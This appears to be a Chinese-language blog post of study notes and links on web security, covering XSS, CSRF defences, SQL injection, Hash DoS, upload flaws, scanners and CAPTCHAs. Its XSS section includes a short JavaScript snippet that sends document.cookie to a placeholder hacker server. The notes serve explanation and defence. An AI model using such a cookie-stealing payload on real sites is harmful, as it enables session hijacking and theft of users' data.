---
layout: post
title: web 安全
category: 技术
keywords: web 安全
---

## web 安全

### XSS (cross-site scripting) 跨站脚本攻击
* [《xss攻击原理与解决方法》](https://blog.csdn.net/qq_21956483/article/details/54377947)
  * XSS攻击是Web攻击中最常见的攻击方法之一，它是通过对网页注入可执行代码且成功地被浏览器
执行，达到攻击的目的。一旦攻击成功，它可以获取用户的联系人列
表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实
施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨
大的，是web安全的头号大敌。
  * 根据XSS攻击的效果可以分为几种类型
    - 第一、XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。

    - 第二、XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛等社交网站上，但OA系统，和CRM系统上也能看到它身影，比如：某CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的XSS存储型攻击。
  * XSS攻击能做些什么

    - 1.窃取cookies，读取目标网站的cookie发送到黑客的服务器上，如下面的代码：
      ```
		var i=document.createElement("img");
		document.body.appendChild(i);
		i.src = "http://www.hackerserver.com/?c=" + document.cookie;
      ```
    - 2.读取用户未公开的资料，如果：邮件列表或者内容、系统的客户资料，联系人列表等等

### CSRF (Cross-site request forgery) 跨站请求伪造
* [《CSRF原理及防范》](https://coderxing.gitbooks.io/architecture-evolution/di-san-pian-ff1a-bu-luo/641-web-an-quan-fang-fan/6412-csrf.html)
  * 和 XSS 一样也是一种比较常见的 web 攻击。CSRF攻击者会过过构造的第三方页面诱导受害者完成加载或者点击，利用受害者的权限，以其身份向合法网站发起恶意请求，通常用户发生状态改变的请求，比如虚拟货币的转账，账号信息修改，恶意发邮件等等
  * CSRF 的防范
​    目前主要有如下几种方式：
    - 添加 Referer 域名白名单：HTTP 的 Referer 头记录了当前请求的来源页面的URL，如果用户是通过浏览器打开的网页一般都会带有这个信息。可以验证 URL 的域名是否在网站允许的白名单呢内，如果不在则拒绝请求。这种方式实现比较简单，而且可以在web 服务器层统一配置，减少了后端开发成本，当 Referer 页可以伪造，用户浏览器的可靠性也不能完全信赖，判断 Referer 可以做为一种辅助手段，但不能根治 CSRF。
    - 令牌 (Token )验证：令牌验证的方式，这是目前方法CSRF的一种普遍方法，其原理是在用户正式提交数据更新之前，给用户生成一个 token，一方面token保存在服务端，比如Session 或者缓存中，一方面输出请求发生的页面上，在用户提交请求时连同token一同提交，服务获得接收到请求之后再做token验证，token 不存在、或者token不一致，或者失效都算作验证失败。token 的生成具有一定的随机性，而且是在提交数据的页面生成，攻击这往往难于伪造。token 一般作为一个post 字段提交，或者作为ajax请求的header信息提交。

    - [如何通过JWT防御CSRF](https://segmentfault.com/a/1190000003716037)
    - [Jwt 中 token应该存储到哪里](https://www.cnblogs.com/lemos/p/7277384.html)

### SQL 注入

* [《SQL注入》](https://coderxing.gitbooks.io/architecture-evolution/di-san-pian-ff1a-bu-luo/641-web-an-quan-fang-fan/6413-sql-zhu-ru.html)

### Hash Dos


* [《邪恶的JAVA HASH DOS攻击》](http://www.freebuf.com/articles/web/14199.html)
	* 利用JsonObject 上传大Json，JsonObject 底层使用HashMap；不同的数据产生相同的hash值，使得构建Hash速度变慢，耗尽CPU。
* [《一种高级的DoS攻击-Hash碰撞攻击》](http://blog.it2048.cn/article_hash-collision.html )
* [《关于Hash Collision DoS漏洞：解析与解决方案》](http://www.iteye.com/news/23939/)

### 脚本注入

* [《上传文件漏洞原理及防范》](https://coderxing.gitbooks.io/architecture-evolution/di-san-pian-ff1a-bu-luo/641-web-an-quan-fang-fan/6414-shang-chuan-wen-jian-guo-lv.html)

### 漏洞扫描工具
* [《DVWA》](https://coderxing.gitbooks.io/architecture-evolution/di-san-pian-ff1a-bu-luo/6421-dvwa.html)
* [W3af](https://coderxing.gitbooks.io/architecture-evolution/di-san-pian-ff1a-bu-luo/w3af.html)
* [OpenVAS详解](https://blog.csdn.net/xygg0801/article/details/53610640)

### 验证码

* [《验证码原理分析及实现》](https://blog.csdn.net/niaonao/article/details/51112686)

* [《详解滑动验证码的实现原理》](https://my.oschina.net/jiangbianwanghai/blog/1031031)
	* 滑动验证码是根据人在滑动滑块的响应时间，拖拽速度，时间，位置，轨迹，重试次数等来评估风险。

* [《淘宝滑动验证码研究》](https://www.cnblogs.com/xcj26/p/5242758.html)
